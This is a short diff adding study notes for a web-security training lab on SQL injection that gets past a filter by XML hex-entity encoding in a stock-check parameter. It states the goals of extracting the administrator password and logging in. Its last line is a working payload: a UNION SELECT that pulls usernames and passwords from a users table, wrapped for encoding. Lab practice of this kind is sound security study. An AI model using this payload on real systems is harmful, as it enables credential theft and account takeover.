@@ -1,0 +1,11 @@
+Lab #17: SQL injection with filter bypass via XML encoding
+
+Vulnerable parameter - stock check feature
+
+End Goals:
+1) Exploit SQLi to output the password of the administrator user
+2) Login as the administrator user
+
+Analysis:
+
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
